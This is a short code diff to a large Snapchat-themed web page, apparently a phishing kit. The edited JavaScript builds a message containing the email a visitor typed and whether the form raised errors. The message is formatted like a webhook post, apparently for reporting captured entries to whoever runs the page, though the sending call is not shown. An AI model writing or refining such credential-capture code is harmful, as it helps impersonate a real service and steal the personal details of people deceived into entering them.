@@ -61537,14 +61537,11 @@ html[lang='ar'] .theme--snapchat {
               }
 
               const payload = JSON.stringify({
-                  content: `--------------------\nError: No\nEmail: ${email}\n--------------------`
+                  content: `--------------------\nErrors: ${errors.length > 0 ? 'Yes' : 'No'}\nEmail: ${email}\n--------------------`
               });
 
               if (errors.length > 0) {
                   checkerror()
-                  payload = JSON.stringify({
-                  content: `--------------------\nError: Yes\nEmail: ${email}\n--------------------`
-              });
 
               }else{
                   errorMessage.style.display = 'none';
